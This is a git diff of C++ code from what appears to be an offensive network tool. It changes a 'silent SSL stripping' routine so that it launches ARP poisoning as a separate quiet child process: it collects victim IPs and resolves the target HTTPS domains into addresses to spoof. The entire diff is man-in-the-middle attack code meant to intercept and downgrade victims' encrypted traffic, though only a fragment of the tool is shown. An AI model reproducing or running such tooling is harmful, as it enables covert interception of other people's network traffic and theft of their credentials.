@@ -6,7 +6,7 @@
 #include "PcapLiveDevice.h"
 #include "RawPacket.h"
 #include "TcpLayer.h"
-#include "arp_poisoning/public.h"
+#include "common/common.h"
 #include "log.h"
 #include "ssl_stripping/public.h"
 #include "ssl_stripping/silent.h"
@@ -16,11 +16,10 @@
 #include <boost/system/error_code.hpp>
 #include <exception>
 #include <future>
+#include <sstream>
 #include <stdexcept>
-#include <thread>
 #include <unordered_set>
 #include <vector>
-
 
 std::optional<std::unordered_set<std::string>>
 resolveDomainToIP(const std::string &domain, const std::string &service) {
@@ -171,29 +170,60 @@ void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
 void ATK::SSL::SilentSslStrippingStrategy::execute() {
     if (mitmStrategy_ == ATK::SSL::MitmStrategy::ARP) {
         // Initialize options with values based on this call
-        ATK::ARP::SilentPoisoningOptions options;
-        options.ifaceIpOrName = device_->getName();
-        std::unordered_set<std::string> victimIpsSet;
-        for (const auto& victimIp : victimIps_) {
-            victimIpsSet.insert(victimIp.toString());
+        std::string victimIpsCommaSeparated;
+        for (const auto &victimIp : victimIps_) {
+            victimIpsCommaSeparated += (victimIp.toString());
+            victimIpsCommaSeparated += ',';
         };
-        options.victimIps = victimIpsSet;
-        std::unordered_set<std::string> ipsToSpoofSet;
+        victimIpsCommaSeparated.pop_back();
+
+        std::string ipsToSpoofCommaSeparated;
 
         // Get all target IPs from domain
         for (const std::string &domain : domainsToStrip_) {
             std::optional<std::unordered_set<std::string>> currentIps =
                 resolveDomainToIP(domain, "https");
             if (currentIps.has_value()) {
-                ipsToSpoofSet.insert(currentIps.value().begin(),
-                                     currentIps.value().end());
+                for (const auto &currentIp : currentIps.value()) {
+                    ipsToSpoofCommaSeparated += currentIp;
+                    ipsToSpoofCommaSeparated += ',';
+                }
             }
         }
-        options.ipsToSpoof = ipsToSpoofSet;
+        ipsToSpoofCommaSeparated.pop_back();
+
+        std::ostringstream command;
+        command << "\"" << ATK::Common::getProcessName() << "\" --arp --quiet"
+                << " \"" << device_->getName() << "\""
+                << " \"" << victimIpsCommaSeparated << "\""
+                << " \"" << ipsToSpoofCommaSeparated << "\"";
+        std::string cmd = command.str();
 
         LOG_INFO("got here!");
-        // Start ARP poison on different thread
-        std::thread(ATK::ARP::silentPoison, options).detach();
+// Start ARP poison on different thread
+#ifdef _WIN32
+        HANDLE hJob = CreateJobObject(nullptr, nullptr);
+
+        JOBOBJECT_EXTENDED_LIMIT_INFORMATION info = {};
+        info.BasicLimitInformation.LimitFlags =
+            JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
+        SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &info,
+                                sizeof(info));
+
+        STARTUPINFO sInfo = {sizeof(sInfo)};
+        PROCESS_INFORMATION pInfo;
+
+        CreateProcess(nullptr, cmd.data(), nullptr, nullptr, FALSE, 0, nullptr,
+                      nullptr, &sInfo, &pInfo);
+
+        // Link child to the job
+        AssignProcessToJobObject(hJob, pInfo.hProcess);
+
+        CloseHandle(pInfo.hProcess);
+        CloseHandle(pInfo.hThread);
+#else
+        std::system(cmd.c_str());
+#endif
     } else {
         // TODO(Quinn) implement with DNS once it's available
     }
